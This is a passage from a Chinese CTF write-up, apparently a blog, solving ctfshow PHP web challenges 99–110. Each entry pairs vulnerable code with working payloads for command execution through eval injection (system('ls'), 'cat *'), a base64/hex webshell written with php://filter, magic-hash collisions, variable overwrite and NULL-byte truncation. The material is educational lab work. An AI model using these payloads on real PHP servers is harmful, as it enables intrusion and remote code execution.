punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//in_array()函数有漏洞 没有设置第三个参数 就可以形成自动转换eg:n=1.php自动转换为1</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//写入1.php文件 内容是&lt;?php system($_POST[1]);</span><span class="token delimiter important">?></span></span>&#125;?></code></pre><p>array_push——往数组尾部插入元素<br>rand(1,$i)——随机生成1-877之间的数<br>&#x2F;&#x2F;所以array_push($allow, rand(1,$i))就是往数组中插入1-877之间的数字<br>in_array——搜索数组中是否存在指定的值:<br>in_array(search,array,type)<br>search为指定搜索的值<br>array为指定检索的数组<br>type为TRUE则 函数还会检查 search的类型是否和 array中的相同</p><p>综上，我们可以发现数组中的值是int，而在弱类型中当php字符串和int比较时,字符串会被转换成int，所以 字符串中数字后面的字符串会被忽略。题目中的in_array没有设置type,我们可以输入字符串5.php(此处数字随意，只要在rand(1,0x36d)之间即可)，转换之后也就是5</p><p>看到file_put_contents，可以使用php伪协议</p><h4 id="web100-is-numeric-运算符优先级"><a href="#web100-is-numeric-运算符优先级" class="headerlink" title="web100(is_numeric 运算符优先级)"></a>web100(is_numeric 运算符优先级)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ctfshow.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag in class ctfshow;</span><span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v0</span><span class="token operator">=</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// v2不能有;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// v3必须有;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v2</span></span>('ctfshow')<span class="token interpolation"><span class="token variable">$v3</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>运算符优先级：**&amp;&amp; &gt; || &gt; &#x3D; &gt; and &gt; or**</p><p><strong>is_numeric()</strong> 函数用于检测变量是否为数字或数字字符串。</p><p>是数字和数字字符串则返回 TRUE，否则返回 FALSE</p><p><strong>var_dump()<strong>函数可以输出多个值。</strong>print_r</strong>也可以</p><p><strong>&#x3D;<strong>的运算符比</strong>and</strong>高</p><p>对于v0的值只需要看v1就可以v2,v3是干扰</p><p>所以v1输入数字</p><p>Payload:</p><blockquote><p>?v1&#x3D;11&amp;v2&#x3D;var_dump($ctfshow)&#x2F;<em>&amp;v3&#x3D;</em>&#x2F;;</p><p>?v1&#x3D;1&amp;v2&#x3D;system(‘ls’)&#x2F;<em>&amp;v3&#x3D;</em>&#x2F;;</p></blockquote><p>最后flag<code>0x2d</code>要转化为<code>-</code></p><h4 id="web101-反射类"><a href="#web101-反射类" class="headerlink" title="web101(反射类)"></a>web101(反射类)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\"|\'|\,|\.|\;|\?|[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\"|\'|\,|\.|\?|[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$v2</span></span>('ctfshow')<span class="token interpolation"><span class="token variable">$v3</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>涉及到类，可以考虑使用 ReflectionClass 建立反射类。</p><p>new ReflectionClass($class) 可以获得类的反射对象（包含元数据信息）。</p><p>元数据对象（包含class的所有属性&#x2F;方法的元数据信息）。</p><p>payload：v1&#x3D;1&amp;v2&#x3D;echo new ReflectionClass&amp;v3&#x3D;;</p><p>flag中有些字符经过ACSII码变换，好像还少了一位，爆破即可</p><h4 id="web102-substr-call-user-func"><a href="#web102-substr-call-user-func" class="headerlink" title="web102(substr call_user_func)"></a>web102(substr call_user_func)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v4</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 截去了前两个字符</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p>**substr() **:函数返回字符串的一部分</p><p>**call_user_func()**：把第一个参数作为回调函数使用，后面的参数是这个函数的参数。返回调用函数的返回值。其实就是一种特殊的调用函数的方式。</p><p><strong>php5</strong>下is_numeric可识别16进制，如0x2e，然后调用hex2bin转成字符串写入木马，但题目环境没配好，是<strong>php7</strong>,所以要另换方法。<br>用伪协议写入，所以需要base64编码后转成16进制全是数字的字符串</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'&lt;?=`cat *`;'</span><span class="token punctuation">;</span> <span class="token variable">$b</span><span class="token operator">=</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//$a=PD89YGNhdCAqYDs=</span> <span class="token variable">$c</span><span class="token operator">=</span><span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'PD89YGNhdCAqYDs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span> 得到5044383959474e6864434171594473</code></pre><p><strong>PHP短标签</strong></p><?=(表达式)?><p>等价于<?php echo (表达式)?></p><p>Payload:</p><blockquote><p>GET:?v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php</p><p>POST:v1&#x3D;hex2bin</p></blockquote><h4 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.*p.*h.*p.*/i"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Sorry'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>加了个鸡肋的限制，因为本来就是用base64加密后的，所以没什么影响</p><h4 id="web104-md5-sha1"><a href="#web104-md5-sha1" class="headerlink" title="web104(md5 sha1)"></a>web104(md5 sha1)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>shal函数就是计算散列函数，可以理解为一个不可逆的加密函数，这题没啥过滤，直接传两个相同的参数就好了，构造payload</p><p>或者使用数组也可以绕过</p><p>值的判断是使用 <code>==</code>，所以找加密后 0e 开头的两个值也可以。</p><blockquote><p>aaK1STfY -&gt; 0e76658526655756207688271159624026011393</p><p>aaO8zKZF -&gt; 0e89257456677279068558073954252716165668</p></blockquote><p>以下这些字符串，md5哈希之后都是0e开头的：</p><blockquote><p>s878926199a -&gt; 0e545993274517709034328855841020</p><p>s155964671a -&gt; 0e342768416822451524974117254469</p><p>s214587387a -&gt; 0e848240448830537924465865611904 </p><p>s214587387a -&gt; 0e848240448830537924465865611904 </p><p>QLTHNDT -&gt; 0e405967825401955372549139051580 </p><p>QNKCDZO -&gt; 0e830400451993494058024219903391 </p><p>EEIZDOI -&gt; 0e782601363539291779881938479162 </p><p>240610708 -&gt; 0e462097431906509019562988736854 </p><p>4011627063 -&gt; 0e485805687034439905938362701775 </p><p>4775635065 -&gt; 0e998212089946640967599450361168 </p><p>4790555361 -&gt; 0e643442214660994430134492464512 </p><p>5432453531 -&gt; 0e512318699085881630861890526097 </p><p>5579679820 -&gt; 0e877622011730221803461740184915 </p><p>5585393579 -&gt; 0e664357355382305805992765337023 </p><p>6376552501 -&gt; 0e165886706997482187870215578015 </p><p>7124129977 -&gt; 0e500007361044747804682122060876 </p><p>7197546197 -&gt; 0e915188576072469101457315675502 </p><p>7656486157 -&gt; 0e451569119711843337267091732412</p></blockquote><h4 id="web105-php变量覆盖"><a href="#web105-php变量覆盖" class="headerlink" title="web105(php变量覆盖)"></a>web105(php变量覆盖)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$error</span><span class="token operator">=</span><span class="token string single-quoted-string">'你还想要flag嘛？'</span><span class="token punctuation">;</span><span class="token variable">$suces</span><span class="token operator">=</span><span class="token string single-quoted-string">'既然你想要那给你吧！'</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token operator">===</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token operator">===</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what are you doing?!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$$key</span><span class="token operator">=</span><span class="token variable">$$value</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"your are good"</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$suces</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><ul><li><p>本题考查变量覆盖和<code>die()</code>的知识</p></li><li><p><code>$$a = $$b</code>可以类似于，将$a的地址指向$b</p><p>所以无论$b怎么改变值，$a的值都会和$b一样</p></li><li><p><code>die()</code>函数虽然会终止程序，但同时也会输出括号内的终止提示信息</p></li><li><p>本题利用变量覆盖和<code>die()</code>函数的特性</p><ol><li>先对get的内容进行覆盖，且不能覆盖error，所以要覆盖suces，即?suces&#x3D;flag，此时suces&#x3D;&gt;flag的地址</li><li>再对post的内容进行覆盖，且不能将flag直接覆盖，所以只能error&#x3D;suces，此时error&#x3D;&gt;flag的地址</li><li>此时无论进入哪个<code>die()</code>函数，都可以输出<code>$flag</code>的值</li></ol></li></ul><p>Payload:</p><blockquote><p>GET:?suces&#x3D;flag</p><p>POST:error&#x3D;suces</p></blockquote><h4 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$v1</span><span class="token operator">!=</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> </code></pre><p>加了限制，Payload同104</p><h4 id="web107-parse-str"><a href="#web107-parse-str" class="headerlink" title="web107(parse_str)"></a>web107(parse_str)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </code></pre><p><strong>parse_str</strong>($v1,$v2); &#x2F;&#x2F;把v1的值相应的换成键值对再存入v2(数组)<br>v1&#x3D;flag&#x3D;114&amp;index&#x3D;300的话，<br>v2就变成一个数组，内容为flag–&gt;114      index–&gt;300（分为这两个键值对）</p><p>所以只需要让传入的flag md5值与v3一样就可</p><p>Payload:</p><blockquote><p>POST:v1&#x3D;flag&#x3D;47bce5c74f589f4867dbd57e9ca9f808</p><p>GET:?v3&#x3D;aaa</p></blockquote><h4 id="we108-ereg-NULL截断漏洞"><a href="#we108-ereg-NULL截断漏洞" class="headerlink" title="we108(ereg NULL截断漏洞)"></a>we108(ereg NULL截断漏洞)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ereg</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"^[a-zA-Z]+$"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">FALSE</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//只有36d的人才能看到flag</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </code></pre><p>ereg (“^[a-zA-Z]+$”, $_GET[‘c’])&#x3D;&#x3D;&#x3D;FALSE</p><p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字 母的字符是大小写敏感的。</p><p>结合ereg()函数用法，搜索不到指定字符串就会返回FALSE</p><p>所以要让c中有字母，但不能出现其他东西</p><p>ereg 函数存在 NULL 截断漏洞，可以绕过正则过滤，使用 %00 截断。</p><p>0x36d，转十进制是877。</p><p>Payload:<code>c=a%00778</code></p><h4 id="web109-php内置类的使用"><a href="#web109-php内置类的使用" class="headerlink" title="web109(php内置类的使用)"></a>web109(php内置类的使用)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p>看到echo new尝试反射类</p><p>Payload：</p><blockquote><p>?v1&#x3D;Reflectionclass&amp;v2&#x3D;system(‘tac fl36dg.txt’)</p><p>?v1&#x3D;Exception&amp;v2&#x3D;system(‘cat *’)  异常处理</p><p>?v1&#x3D;class{ public function __construct(){ system(‘ls’); } };&amp;v2&#x3D;a  用匿名类绕过 </p></blockquote><p>v1&#x3D;内置类&amp;v2&#x3D;system(‘ls’)即可 php中会先执行ls命令然后把结果作为参数再执行但ls的结果已经被输出了</p><h4 id="web110-FilesystemIterator-class"><a href="#web110-FilesystemIterator-class" class="headerlink" title="web110(FilesystemIterator class)"></a>web110(FilesystemIterator class)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string 